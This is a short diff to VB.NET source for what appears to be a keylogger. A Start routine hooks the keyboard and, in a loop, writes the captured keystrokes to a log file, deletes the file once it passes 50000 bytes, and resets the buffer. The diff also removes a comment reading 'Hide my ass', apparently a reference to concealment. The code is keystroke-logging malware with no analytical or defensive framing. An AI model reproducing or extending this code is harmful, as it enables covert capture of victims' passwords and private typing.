@@ -94,7 +94,6 @@
         End Function
 
         Public Sub Start()
-            'Hide my ass
 
             'Hook keyboard
             HookKeyboard()
@@ -115,16 +114,11 @@
                     If info.Length >= 50000 Then
                         info.Delete()
                     End If
-                Catch
-                End Try
-
-                Try
                     My.Computer.FileSystem.WriteAllText(filepath, KeyLog, True)
+                    KeyLog = ""
                 Catch
                 End Try
 
-                'Reset 
-                KeyLog = ""
                 Threading.Thread.Sleep(5000)
             End While
         End Sub
